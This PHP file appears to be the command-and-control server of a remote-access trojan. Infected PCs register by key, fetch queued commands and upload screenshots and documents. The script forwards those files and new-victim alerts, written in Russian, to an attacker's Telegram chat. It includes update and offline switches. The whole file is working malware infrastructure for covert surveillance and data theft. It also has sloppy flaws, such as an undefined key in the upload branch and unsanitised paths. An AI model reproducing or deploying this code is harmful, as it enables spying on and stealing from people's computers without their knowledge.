<?php
    include('config.php');
    
    function sendTg($message, $tgId){
        $url = 'https://api.telegram.org/' . $GLOBALS['TgBotToken'] . '/sendMessage';
        $params = array(
            'chat_id' => $tgId, 
            'text' => $message, 
            'parse_mode' => 'HTML',
        );
        $result = file_get_contents($url, false, stream_context_create(array(
            'http' => array(
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => http_build_query($params)
            )
        )));

        echo $result;
    }

    function sendTelegram($method, $response)
    {
        $ch = curl_init('https://api.telegram.org/' . $GLOBALS['TgBotToken'] . '/' . $method);  
        curl_setopt($ch, CURLOPT_POST, 1);  
        curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, false);
        $res = curl_exec($ch);
        curl_close($ch);

        return $res;

    }

    if ($_SERVER["REQUEST_METHOD"] == "GET") {

        if (!empty($_GET["ver"])){
            $verFile = file_get_contents("ver");
            $verGet = $_GET["ver"];

            if ($verFile !== $verGet){
                echo "update";
            }
        }
        else {
            exit;
        }

        if (!file_exists("offline")){
            $fp = fopen('offline', "w");
            fwrite($fp, "false");    
            fclose($fp);
        }

        else {
            $str = file_get_contents("offline");
            if ($str === "true"){
                echo $str;
                exit;
            }
        }
        
        if (!empty($_GET["pcKey"])){
            $pcKey = $_GET["pcKey"];

            if (!empty($_GET["tgMes"])){
                $comment = file_get_contents('database/' . $pcKey . '/comment');
                sendTg($_GET["tgMes"] . "\n\nИдентификатор: <code>" . $pcKey . "</code>\nКомментарий: " . $comment, $TgChatId);
            }

            if (!file_exists('database/' . $pcKey)) {    
                mkdir('database/' . $pcKey, 0777, true);
                sendTg("<b>Один из ПК впервые прослушивает!</b>\n\nИдентификатор: <code>" . $pcKey . "</code>", $TgChatId);
                $fp = fopen('database/' . $pcKey . '/comment', "w");
                fwrite($fp, "");    
                fclose($fp);
                $fp = fopen('database/' . $pcKey . '/online', "w");
                fwrite($fp, "");    
                fclose($fp);
                echo "new";
            }

            if (!empty($_GET["getCommands"])){
                $file = 'database/' . $pcKey . '/commands';
                if (file_exists($file)) {    
                    $str = mb_convert_encoding(file_get_contents($file), 'HTML-ENTITIES', "UTF-8");
                    echo file_get_contents($file);
                    $fp = fopen($file, "w");
                    fwrite($fp, "");    
                    fclose($fp);
                }
            }

            $fp = fopen('database/' . $pcKey . '/online', "w");
            fwrite($fp, date('Y-m-d g:i:s', time()));    
            fclose($fp);

        }
    }
    else if ($_SERVER["REQUEST_METHOD"]=="POST"){

        if (!empty($_POST["getScreenshot"])) {
            $file = 'database/' . $pcKey . '/getScreenshot';
            $fileMove = 'database/' . $pcKey . '/screen.png';

            sendTelegram(
                'sendPhoto', 
                array(
                    'chat_id' => $TgChatId,
                    'photo' => curl_file_create($_FILES['document']['tmp_name'])
                )
            );

            unlink($_FILES['document']['tmp_name']);
        }

        if (!empty($_POST["getDocument"])) {
            $file = 'database/' . $pcKey . '/getDocument';
            $fileMove = 'database/' . $pcKey . '/cmd.txt';
            rename($_FILES['document']['tmp_name'], $_FILES['document']['tmp_name'].".txt");

            $resp = sendTelegram(
                'sendDocument', 
                array(
                    'chat_id' => $TgChatId,
                    'document' => curl_file_create($_FILES['document']['tmp_name'].".txt")
                )
            );

            unlink($_FILES['document']['tmp_name'].".txt");
        }
    }
?>


<!-- cringe by @loveappless -->